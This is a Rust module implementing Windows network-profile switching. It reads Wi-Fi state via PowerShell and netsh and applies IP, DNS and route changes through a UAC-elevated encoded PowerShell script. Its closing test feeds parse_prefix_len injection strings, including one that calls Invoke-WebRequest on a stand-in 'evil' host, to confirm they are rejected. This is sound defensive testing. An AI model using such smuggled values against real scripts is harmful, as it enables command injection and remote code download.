//! Windows 平台实现。
//!
//! 设计要点（为什么这么写）：
//!
//! 1. **读取优先走 PowerShell CIM cmdlet**（`Get-NetAdapter` / `Get-NetConnectionProfile`
//!    / `Get-NetIPConfiguration` …）而不是 `netsh` 的文本输出。
//!    原因：`netsh` 的输出是**本地化 + OEM 代码页**的，中文 Windows 下字段名和编码都会变，
//!    解析必然脆。CIM 是对象化的，语言无关，且我们显式把 stdout 编码钉成 UTF-8。
//!
//! 2. **写入走 `netsh`**（`interface ipv4 set address/dnsservers`）—— 这是 Windows 上改
//!    静态 IP/DNS 最稳定的入口。
//!
//! 3. **提权走 UAC**：把要执行的命令渲染成一段 PowerShell 脚本，
//!    用 `-EncodedCommand`（UTF-16LE base64，彻底避开引号/编码问题）交给
//!    `Start-Process -Verb RunAs` 以管理员身份执行，一次授权覆盖本批全部操作。
//!
//! 4. **命令参数一律用 `@('a','b')` 数组传递**（`& netsh.exe @(...)`），
//!    不做字符串拼接，避免接口名含空格/特殊字符时被重新切分。

use super::{
    poll_ssid_watch, run, timeout_secs, Health, InterfaceStatus, NetworkPlatform, PrivChannel,
    ProbeTarget, WatcherHandle,
};
use crate::config::{Mode, Profile, V6Mode};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

/// 状态快照缓存 TTL。
/// `resolve_current_name()` 一次要问 SSID + 网关 MAC + BSSID，而每次读取都要拉起一次
/// PowerShell（百毫秒级）。缓存让一次身份解析只付一次进程开销。
const CACHE_TTL: Duration = Duration::from_millis(1200);

fn cache() -> &'static Mutex<Option<(Instant, InterfaceStatus)>> {
    static C: OnceLock<Mutex<Option<(Instant, InterfaceStatus)>>> = OnceLock::new();
    C.get_or_init(|| Mutex::new(None))
}

// —————————————————————————— PowerShell 调用 ——————————————————————————

/// 执行一段 PowerShell 脚本并取回 stdout。
///
/// 脚本首行由本函数统一注入 `[Console]::OutputEncoding = UTF8`，
/// 保证含中文的返回值（SSID、适配器名）在 Rust 侧能正确按 UTF-8 解码。
/// 调用时**不要**在脚本里再执行 `netsh` 等原生命令（它们的输出是 OEM 代码页，
/// 会被 UTF-8 解码器解坏）；需要 netsh 文本时请直接从 Rust 调 `netsh` 并只取 ASCII 字段。
fn ps(script: &str) -> Result<String, String> {
    let full = format!(
        "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;$ProgressPreference='SilentlyContinue';\r\n{}",
        script
    );
    run(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &full,
        ],
    )
}

/// PowerShell 单引号字符串字面量（内部 `'` 翻倍转义）。
fn psq(s: &str) -> String {
    format!("'{}'", s.replace('\'', "''"))
}

/// `@('a','b')` —— 参数数组字面量。永远用数组传参，不做字符串拼接。
fn ps_arr(items: &[&str]) -> String {
    let inner: Vec<String> = items.iter().map(|s| psq(s)).collect();
    format!("@({})", inner.join(","))
}

/// 一行 `netsh.exe` 调用 + 退出码检查（失败即终止整段脚本，避免"部分成功"被当成功）。
fn netsh_line(args: &[&str]) -> String {
    format!(
        "& netsh.exe {}; if ($LASTEXITCODE -ne 0) {{ throw \"netsh exit $LASTEXITCODE\" }};",
        ps_arr(args)
    )
}

/// `-PrefixLength` 只接受整数。在配置进入 PowerShell 之前把 `v6prefix` 收敛成数字：
/// 既给出明确的中文报错，也彻底排除了向 `-PrefixLength` 后面追加 PowerShell 语句的可能。
fn parse_prefix_len(s: &str) -> Result<String, String> {
    match s.trim().parse::<u32>() {
        Ok(n) if n <= 128 => Ok(n.to_string()),
        Ok(n) => Err(format!("v6prefix 超出合法范围 (0-128)：{}", n)),
        Err(_) => Err(format!("v6prefix 必须是 0-128 的整数，收到：{}", s)),
    }
}

/// 标准 base64 编码（自带实现，避免为一个小工具引入依赖）。
fn base64_encode(data: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(T[((n >> 18) & 63) as usize] as char);
        out.push(T[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 {
            T[((n >> 6) & 63) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            T[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}

/// UTF-16LE + base64，供 PowerShell `-EncodedCommand` 使用。
fn encode_command(script: &str) -> String {
    let mut bytes = Vec::with_capacity(script.len() * 2 + 2);
    for u in script.encode_utf16() {
        bytes.extend_from_slice(&u.to_le_bytes());
    }
    base64_encode(&bytes)
}

/// 以管理员身份执行一段 PowerShell 脚本（弹 UAC），失败返回可读错误。
fn run_elevated_ps(body: &str) -> Result<(), String> {
    let inner = format!("$ErrorActionPreference='Stop';\r\n{}\r\n", body);
    let b64 = encode_command(&inner);
    // ExitCode 1223 = ERROR_CANCELLED（用户点了"否"）
    let outer = format!(
        "$ErrorActionPreference='Stop';\
         try {{ $p = Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -PassThru -WindowStyle Hidden \
         -ArgumentList @('-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand','{}'); \
         exit $p.ExitCode }} catch {{ exit 1223 }}",
        b64
    );
    match run(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &outer,
        ],
    ) {
        Ok(_) => Ok(()),
        Err(e) => {
            if e.contains("1223") {
                Err("提权被取消（UAC）".to_string())
            } else {
                Err(format!("提权执行失败: {}", e))
            }
        }
    }
}

/// 当前是否以管理员身份运行（决定 `PrivChannel`）。
fn is_admin() -> bool {
    // 用 .NET 判组身份，比 `net session` 之类的探测更快且无副作用。
    ps("$id=[Security.Principal.WindowsIdentity]::GetCurrent();\
        $p=New-Object Security.Principal.WindowsPrincipal($id);\
        if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { '1' } else { '0' }")
        .map(|s| s.trim() == "1")
        .unwrap_or(false)
}

/// 当前特权通道：已是管理员 → Direct（无弹窗）；否则 → Prompt（UAC）。
pub fn priv_channel() -> PrivChannel {
    static C: OnceLock<PrivChannel> = OnceLock::new();
    *C.get_or_init(|| {
        if is_admin() {
            PrivChannel::Direct
        } else {
            PrivChannel::Prompt
        }
    })
}

// —————————————————————————— 读取：接口与状态 ——————————————————————————

/// 解析 CIM 查询返回的 JSON 对象（取第一条记录）。
fn parse_json_object(out: &str) -> Option<serde_json::Value> {
    let t = out.trim();
    if t.is_empty() {
        return None;
    }
    serde_json::from_str::<serde_json::Value>(t).ok()
}

/// 当前无线适配器名。`MediaType = 'Native 802.11'` 是 Wi-Fi 的语言无关判据。
fn wifi_iface() -> Option<String> {
    let out = ps("$ErrorActionPreference='SilentlyContinue';\
         $a = Get-NetAdapter -Physical | Where-Object { $_.MediaType -eq 'Native 802.11' } | Select-Object -First 1;\
         if (-not $a) { $a = Get-NetAdapter | Where-Object { $_.Name -match 'Wi-?Fi|WLAN|Wireless' } | Select-Object -First 1 };\
         if ($a) { $a.Name }")
    .ok()?;
    let name = out.lines().map(|l| l.trim()).find(|l| !l.is_empty())?;
    Some(name.to_string())
}

/// 读取一次完整状态快照（一次 PowerShell 调用取全部字段）。
fn read_status() -> InterfaceStatus {
    let script = r#"$ErrorActionPreference='SilentlyContinue';
$ad = Get-NetAdapter -Physical | Where-Object { $_.MediaType -eq 'Native 802.11' } | Select-Object -First 1;
if (-not $ad) { $ad = Get-NetAdapter | Where-Object { $_.Name -match 'Wi-?Fi|WLAN|Wireless' } | Select-Object -First 1 }
if (-not $ad) { '{}' ; exit }
$idx = $ad.ifIndex;
$prof = Get-NetConnectionProfile -InterfaceIndex $idx;
$ip   = Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1;
$dns  = Get-DnsClientServerAddress -InterfaceIndex $idx -AddressFamily IPv4;
$v6   = Get-NetIPInterface -InterfaceIndex $idx -AddressFamily IPv6 | Select-Object -First 1;
$rt   = Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv4 -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1;
[pscustomobject]@{
  iface   = $ad.Name;
  ssid    = $prof.Name;
  ipv4    = $ip.IPAddress;
  prefix  = $ip.PrefixLength;
  gateway = $rt.NextHop;
  dns     = ($dns.ServerAddresses -join ',');
  v6dhcp  = $v6.Dhcp
} | ConvertTo-Json -Compress"#;

    let mut st = InterfaceStatus::default();
    let Some(v) = ps(script).ok().and_then(|o| parse_json_object(&o)) else {
        return st;
    };
    let get = |k: &str| -> Option<String> {
        v.get(k)
            .and_then(|x| x.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    };

    st.iface = get("iface");
    st.ssid = get("ssid");
    st.connected = st.ssid.is_some();
    st.ipv4 = get("ipv4");
    st.gateway = get("gateway");
    st.dns = get("dns");
    st.netmask = v
        .get("prefix")
        .and_then(|x| x.as_u64())
        .and_then(|p| prefix_to_mask(p as u32));
    st.v6mode = match get("v6dhcp").as_deref() {
        Some("Enabled") => Some("automatic".to_string()),
        Some("Disabled") => Some("manual".to_string()),
        _ => None,
    };

    // BSSID / 信号强度：只从 netsh 文本里取 ASCII 字段（MAC、百分比），
    // 因此不受中文 Windows 的本地化/代码页影响。
    //
    // 注意这里用 `has_iface` 布尔量而不是 `if let Some(x) = &st.iface`：
    // 后者会让 `st.iface` 在整个块内保持不可变借用，而块内又要写 `st.bssid` 等字段，
    // 触发 E0502（借用了 st 又可变借用 st）。
    if st.iface.is_some() {
        if let Ok(text) = run("netsh", &["wlan", "show", "interfaces"]) {
            for line in text.lines() {
                // BSSID 行：字段名保持英文
                if line.contains("BSSID") {
                    if let Some(m) = super::extract_mac(line) {
                        st.bssid = Some(m);
                    }
                }
                // 信号行：取行内第一个 `NN%`
                if st.rssi.is_none() {
                    if let Some(pct) = percent_in(line) {
                        // 百分比 → dBm 近似：dBm ≈ pct/2 - 100（微软官方给出的换算关系）
                        st.rssi = Some(pct / 2 - 100);
                    }
                }
            }
        }
        // 先算成 owned 值再赋值，避免同时借用 st.gateway 与写 st.gateway_mac
        let gm = st.gateway.as_deref().and_then(gateway_mac_for);
        st.gateway_mac = gm;
    }
    st
}

/// 取行内第一个 `NN%` 的数值。
fn percent_in(line: &str) -> Option<i32> {
    let bytes = line.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            // 向前回溯数字
            let mut j = i;
            while j > 0 && bytes[j - 1].is_ascii_digit() {
                j -= 1;
            }
            if j < i {
                return std::str::from_utf8(&bytes[j..i]).ok()?.parse::<i32>().ok();
            }
        }
        i += 1;
    }
    None
}

/// 前缀长度 → 点分掩码。
fn prefix_to_mask(prefix: u32) -> Option<String> {
    if prefix > 32 {
        return None;
    }
    let bits: u32 = if prefix == 0 {
        0
    } else {
        u32::MAX << (32 - prefix)
    };
    Some(format!(
        "{}.{}.{}.{}",
        (bits >> 24) & 0xFF,
        (bits >> 16) & 0xFF,
        (bits >> 8) & 0xFF,
        bits & 0xFF
    ))
}

/// 网关 IP → MAC（`arp -a` 邻居表；输出仅取 MAC 形态字符串，编码无关）。
fn gateway_mac_for(gw: &str) -> Option<String> {
    let out = run("arp", &["-a"]).ok()?;
    for line in out.lines() {
        if !line.contains(gw) {
            continue;
        }
        if let Some(m) = super::extract_mac(line) {
            return Some(m);
        }
    }
    None
}

/// 带 TTL 的状态快照（避免一次身份解析触发多次 PowerShell 启动）。
fn status_cached() -> InterfaceStatus {
    let mut c = cache().lock().unwrap();
    if let Some((t, st)) = c.as_ref() {
        if t.elapsed() < CACHE_TTL {
            return st.clone();
        }
    }
    let st = read_status();
    *c = Some((Instant::now(), st.clone()));
    st
}

fn invalidate_cache() {
    *cache().lock().unwrap() = None;
}

// —————————————————————————— 写入：结构化操作 ——————————————————————————

/// 结构化特权操作（Windows 版）。渲染成 PowerShell 脚本后经 UAC 执行。
enum WinOp {
    SetDhcp { iface: String },
    SetManual {
        iface: String,
        ip: String,
        mask: String,
        gw: String,
    },
    SetDns {
        iface: String,
        servers: Vec<String>,
    },
    SetV6Off { iface: String },
    SetV6Auto { iface: String },
    SetV6Manual {
        iface: String,
        addr: String,
        prefix: String,
        gw: String,
    },
    RouteAdd {
        iface: String,
        dest: String,
        gw: Option<String>,
        metric: u32,
    },
    RouteDelete { dest: String },
}

impl WinOp {
    fn render(&self) -> String {
        match self {
            WinOp::SetDhcp { iface } => netsh_line(&[
                "interface",
                "ipv4",
                "set",
                "address",
                &format!("name={}", iface),
                "source=dhcp",
            ]),
            WinOp::SetManual {
                iface,
                ip,
                mask,
                gw,
            } => netsh_line(&[
                "interface",
                "ipv4",
                "set",
                "address",
                &format!("name={}", iface),
                "static",
                ip,
                mask,
                gw,
            ]),
            WinOp::SetDns { iface, servers } => {
                let n = format!("name={}", iface);
                if servers.is_empty() {
                    netsh_line(&["interface", "ipv4", "set", "dnsservers", &n, "source=dhcp"])
                } else {
                    let mut s = netsh_line(&[
                        "interface", "ipv4", "set", "dnsservers", &n, "static", &servers[0],
                        "primary",
                    ]);
                    for (i, sv) in servers.iter().enumerate().skip(1) {
                        s.push_str(&netsh_line(&[
                            "interface",
                            "ipv4",
                            "add",
                            "dnsservers",
                            &n,
                            sv,
                            &format!("index={}", i + 1),
                        ]));
                    }
                    s
                }
            }
            // 关闭 IPv6：禁用适配器上的 ms_tcpip6 绑定（等价于"关掉 IPv6"）
            WinOp::SetV6Off { iface } => format!(
                "Disable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction Stop;",
                psq(iface)
            ),
            WinOp::SetV6Auto { iface } => format!(
                "Enable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue;\
                 Set-NetIPInterface -InterfaceAlias {} -AddressFamily IPv6 -Dhcp Enabled -ErrorAction SilentlyContinue;",
                psq(iface),
                psq(iface)
            ),
            WinOp::SetV6Manual {
                iface,
                addr,
                prefix,
                gw,
            } => format!(
                "Get-NetIPAddress -InterfaceAlias {} -AddressFamily IPv6 -ErrorAction SilentlyContinue \
                   | Where-Object {{ $_.PrefixOrigin -ne 'WellKnown' }} | Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue;\
                 Enable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue;\
                 New-NetIPAddress -InterfaceAlias {} -IPAddress {} -PrefixLength {} -DefaultGateway {} -ErrorAction Stop | Out-Null;",
                psq(iface),
                psq(iface),
                 psq(iface),
                 psq(addr),
                 psq(prefix),
                 psq(gw)
            ),
            WinOp::RouteAdd {
                iface,
                dest,
                gw,
                metric,
            } => {
                // 先删同名路由，避免重复添加报错（幂等）
                let mut s = format!(
                    "Remove-NetRoute -DestinationPrefix {} -Confirm:$false -ErrorAction SilentlyContinue;",
                    psq(dest)
                );
                let next_hop = match gw {
                    Some(g) if !g.is_empty() => format!(" -NextHop {}", psq(g)),
                    _ => String::new(),
                };
                s.push_str(&format!(
                    "New-NetRoute -DestinationPrefix {} -InterfaceAlias {}{} -RouteMetric {} -ErrorAction Stop | Out-Null;",
                    psq(dest),
                    psq(iface),
                    next_hop,
                    metric
                ));
                s
            }
            WinOp::RouteDelete { dest } => format!(
                "$r = Get-NetRoute -DestinationPrefix {} -ErrorAction SilentlyContinue;\
                 if ($r) {{ $r | Remove-NetRoute -Confirm:$false -ErrorAction Stop }};",
                psq(dest)
            ),
        }
    }
}

/// 批量执行特权操作（一次 UAC 授权覆盖整批）。
fn exec_ops(ops: &[WinOp]) -> Result<(), String> {
    if ops.is_empty() {
        return Ok(());
    }
    let body: String = ops.iter().map(|o| o.render()).collect::<Vec<_>>().join("\r\n");
    let r = run_elevated_ps(&body);
    invalidate_cache();
    r
}

// —————————————————————————— Windows 实现 ——————————————————————————

pub struct WindowsPlatform;

impl NetworkPlatform for WindowsPlatform {
    fn watch_ssid(&self, cb: Box<dyn Fn(Option<String>) + Send + Sync>) -> WatcherHandle {
        poll_ssid_watch(|| WindowsPlatform.get_current_ssid(), cb)
    }

    fn get_current_ssid(&self) -> Option<String> {
        status_cached().ssid
    }

    fn get_status(&self) -> InterfaceStatus {
        status_cached()
    }

    fn apply_profile(&self, p: &Profile) -> Result<(), String> {
        let iface = wifi_iface().ok_or("未找到无线网卡（请确认 Wi-Fi 适配器已启用）")?;
        let mut ops: Vec<WinOp> = Vec::new();

        match p.mode {
            Mode::Manual => {
                let ip = p.ip.clone().ok_or("manual 模式缺 ip")?;
                let mask = p.netmask.clone().ok_or("manual 模式缺 netmask")?;
                let gw = p.gateway.clone().ok_or("manual 模式缺 gateway")?;
                ops.push(WinOp::SetManual {
                    iface: iface.clone(),
                    ip,
                    mask,
                    gw,
                });
            }
            Mode::Dhcp => ops.push(WinOp::SetDhcp {
                iface: iface.clone(),
            }),
        }

        // DNS（空 = 交回 DHCP 自动获取）
        let servers: Vec<String> = p
            .dns
            .as_deref()
            .unwrap_or("")
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        ops.push(WinOp::SetDns {
            iface: iface.clone(),
            servers,
        });

        // IPv6
        match p.v6mode {
            Some(V6Mode::Off) => ops.push(WinOp::SetV6Off {
                iface: iface.clone(),
            }),
            Some(V6Mode::Automatic) => ops.push(WinOp::SetV6Auto {
                iface: iface.clone(),
            }),
            Some(V6Mode::Manual) => {
                let addr = p.ipv6.clone().ok_or("v6 manual 缺 ipv6")?;
                let raw = p.v6prefix.clone().ok_or("v6 manual 缺 v6prefix")?;
                let prefix = parse_prefix_len(&raw)?;
                let gw = p.v6gateway.clone().ok_or("v6 manual 缺 v6gateway")?;
                ops.push(WinOp::SetV6Manual {
                    iface: iface.clone(),
                    addr,
                    prefix,
                    gw,
                });
            }
            None => {}
        }

        exec_ops(&ops)
    }

    fn set_dhcp(&self) -> Result<(), String> {
        let iface = wifi_iface().ok_or("未找到无线网卡")?;
        exec_ops(&[
            WinOp::SetDhcp {
                iface: iface.clone(),
            },
            WinOp::SetDns {
                iface,
                servers: Vec::new(),
            },
        ])
    }

    fn resolve_gateway_mac(&self) -> Option<String> {
        status_cached().gateway_mac
    }

    fn resolve_bssid(&self) -> Option<String> {
        status_cached().bssid
    }

    fn probe(&self, target: &ProbeTarget, timeout_ms: u64) -> Health {
        use crate::config::ProbeMode;
        // Windows ping：-n 次数，-w 超时(毫秒)
        let icmp = || -> bool {
            let t = target.icmp_target.as_deref().unwrap_or("223.5.5.5");
            let ms = timeout_ms.max(1000).to_string();
            run("ping", &["-n", "1", "-w", &ms, t]).is_ok()
        };
        // curl.exe 自 Windows 10 1803 起内置
        let http = || -> bool {
            let url = match target.http_target.as_deref() {
                Some(u) if !u.is_empty() => u,
                _ => return false,
            };
            let secs = timeout_secs(timeout_ms);
            match run(
                "curl.exe",
                &[
                    "-sS", "-m", &secs, "-o", "NUL", "-w", "%{http_code}", url,
                ],
            ) {
                Ok(code) => matches!(code.trim().parse::<u16>(), Ok(c) if (200..400).contains(&c)),
                Err(_) => false,
            }
        };

        let dead = match target.mode {
            ProbeMode::Icmp => !icmp(),
            ProbeMode::Http => !http(),
            // both：两端同时失败才判死
            ProbeMode::Both => !(icmp() || http()),
        };
        if dead {
            Health::Fail
        } else {
            Health::Ok
        }
    }

    fn add_route(&self, dest: &str, gw: &str, metric: u32) -> Result<(), String> {
        let iface = wifi_iface().ok_or("未找到无线网卡")?;
        exec_ops(&[WinOp::RouteAdd {
            iface,
            dest: dest.to_string(),
            gw: Some(gw.to_string()),
            metric,
        }])
    }

    fn delete_route(&self, dest: &str) -> Result<(), String> {
        exec_ops(&[WinOp::RouteDelete {
            dest: dest.to_string(),
        }])
    }

    fn launch_app(&self, app: &str, args: &[String]) -> Result<(), String> {
        let arg_list = if args.is_empty() {
            String::new()
        } else {
            let refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
            format!(" -ArgumentList {}", ps_arr(&refs))
        };
        // 走 cmd 的 start，可同时支持 exe / .lnk / 文档路径 / 协议
        let script = format!(
            "$ErrorActionPreference='Stop'; Start-Process -FilePath {}{} | Out-Null",
            psq(app),
            arg_list
        );
        ps(&script).map(|_| ())
    }

    fn run_script(&self, path: &str, args: &[String], elevated: bool) -> Result<(), String> {
        // 按扩展名决定解释器：.ps1 → PowerShell；.bat/.cmd → cmd；其余直接执行
        let lower = path.to_ascii_lowercase();
        let (file, all_args): (String, Vec<String>) = if lower.ends_with(".ps1") {
            let mut a = vec![
                "-NoProfile".to_string(),
                "-ExecutionPolicy".to_string(),
                "Bypass".to_string(),
                "-File".to_string(),
                path.to_string(),
            ];
            a.extend(args.iter().cloned());
            ("powershell.exe".to_string(), a)
        } else if lower.ends_with(".bat") || lower.ends_with(".cmd") {
            let mut a = vec!["/c".to_string(), path.to_string()];
            a.extend(args.iter().cloned());
            ("cmd.exe".to_string(), a)
        } else {
            (path.to_string(), args.to_vec())
        };

        if elevated {
            // 用户脚本提权：显式走 UAC，确保用户每次知情（与网络配置操作区别对待）
            let refs: Vec<&str> = all_args.iter().map(|s| s.as_str()).collect();
            let body = format!(
                "$p = Start-Process -FilePath {} -ArgumentList {} -Verb RunAs -Wait -PassThru;\
                 exit $p.ExitCode",
                psq(&file),
                ps_arr(&refs)
            );
            run_elevated_ps(&body)
        } else {
            let refs: Vec<&str> = all_args.iter().map(|s| s.as_str()).collect();
            run(&file, &refs).map(|_| ())
        }
    }

    fn list_known_ssids(&self) -> Option<Vec<String>> {
        // 直接读 WLAN 配置 XML（`[xml]` 解析），语言无关且编码正确；
        // 比解析 `netsh wlan show profiles` 的本地化文本可靠得多。
        let script = r#"$ErrorActionPreference='SilentlyContinue';
$d = Join-Path $env:ProgramData 'Microsoft\Wlansvc\Profiles\Interfaces';
if (-not (Test-Path $d)) { exit }
$names = Get-ChildItem -Path $d -Recurse -Filter *.xml -ErrorAction SilentlyContinue | ForEach-Object {
  try { ([xml][System.IO.File]::ReadAllText($_.FullName)).WLANProfile.name } catch { }
} | Where-Object { $_ } | Sort-Object -Unique;
[Console]::Out.Write(($names -join "`n"))"#;
        let out = ps(script).ok()?;
        let list: Vec<String> = out
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect();
        if list.is_empty() {
            None
        } else {
            Some(list)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::parse_prefix_len;

    #[test]
    fn prefix_len_accepts_integers_only() {
        assert_eq!(parse_prefix_len("64").unwrap(), "64");
        assert_eq!(parse_prefix_len(" 8 ").unwrap(), "8");
        assert_eq!(parse_prefix_len("0").unwrap(), "0");
        assert_eq!(parse_prefix_len("128").unwrap(), "128");
    }

    #[test]
    fn prefix_len_rejects_injection_and_out_of_range() {
        // 关键：这些曾经会被原样插进 `-PrefixLength`，等价于 PowerShell 语句注入
        for bad in [
            "64; Invoke-WebRequest http://evil/x",
            "64\nGet-Process",
            "64$(calc)",
            "",
            "abc",
            "129",
            "-1",
        ] {
            assert!(parse_prefix_len(bad).is_err(), "accepted bad prefix: {:?}", bad);
        }
    }
}
